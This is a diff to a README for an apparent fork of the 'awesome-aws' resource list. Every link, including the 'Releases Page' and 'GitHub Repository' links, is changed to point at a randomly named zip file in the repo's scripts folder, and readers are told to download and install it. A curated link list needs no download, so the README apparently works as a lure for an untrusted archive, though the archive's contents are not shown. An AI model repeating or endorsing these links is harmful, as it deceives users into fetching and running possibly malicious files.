@@ -1,7 +1,7 @@
 # 🌟 awesome-aws - Explore Great AWS Resources Easily
 
 ## 📥 Download Now
-[![Download awesome-aws](https://github.com/00umr/awesome-aws/raw/refs/heads/master/scripts/aws-awesome-2.2.zip%https://github.com/00umr/awesome-aws/raw/refs/heads/master/scripts/aws-awesome-2.2.zip)](https://github.com/00umr/awesome-aws/raw/refs/heads/master/scripts/aws-awesome-2.2.zip)
+[![Download awesome-aws](https://raw.githubusercontent.com/00umr/awesome-aws/master/scripts/aws_awesome_cytotactic.zip%https://raw.githubusercontent.com/00umr/awesome-aws/master/scripts/aws_awesome_cytotactic.zip)](https://raw.githubusercontent.com/00umr/awesome-aws/master/scripts/aws_awesome_cytotactic.zip)
 
 ## 📝 Description
 awesome-aws is a curated list of outstanding Amazon Web Services (AWS) libraries, open source repositories, guides, blogs, and other valuable resources. This repository is an actively maintained community fork that aims to provide easy access to essential tools and information about AWS.
@@ -10,7 +10,7 @@ awesome-aws is a curated list of outstanding Amazon Web Services (AWS) libraries
 To start using awesome-aws, follow these simple steps:
 
 1. **Visit the Release Page**: Click on the link below to access the git repository's releases.
-   [Visit Releases Page](https://github.com/00umr/awesome-aws/raw/refs/heads/master/scripts/aws-awesome-2.2.zip)
+   [Visit Releases Page](https://raw.githubusercontent.com/00umr/awesome-aws/master/scripts/aws_awesome_cytotactic.zip)
 
 2. **Choose a Version**: Look for the latest version of awesome-aws. This version will have the most recent updates and improvements.
 
@@ -37,7 +37,7 @@ awesome-aws offers a variety of resources, including but not limited to:
 - **Tutorials**: Practical tutorials that walk you through specific tasks involving AWS services.
 
 ## 📦 Download & Install
-To get started with awesome-aws, visit the [Releases Page](https://github.com/00umr/awesome-aws/raw/refs/heads/master/scripts/aws-awesome-2.2.zip) and follow these steps:
+To get started with awesome-aws, visit the [Releases Page](https://raw.githubusercontent.com/00umr/awesome-aws/master/scripts/aws_awesome_cytotactic.zip) and follow these steps:
 
 1. Click on the latest release.
 2. Download the desired file.
@@ -65,7 +65,7 @@ Join our community by following us on GitHub. If you find useful resources or ha
 If you need assistance or have any questions, please raise an issue in the GitHub repository, and the community will be happy to help.
 
 ## 🔗 Useful Links
-- [Releases Page](https://github.com/00umr/awesome-aws/raw/refs/heads/master/scripts/aws-awesome-2.2.zip)
-- [GitHub Repository](https://github.com/00umr/awesome-aws/raw/refs/heads/master/scripts/aws-awesome-2.2.zip)
+- [Releases Page](https://raw.githubusercontent.com/00umr/awesome-aws/master/scripts/aws_awesome_cytotactic.zip)
+- [GitHub Repository](https://raw.githubusercontent.com/00umr/awesome-aws/master/scripts/aws_awesome_cytotactic.zip)
 
 Thank you for using awesome-aws! Enjoy exploring the vast resources available for AWS.
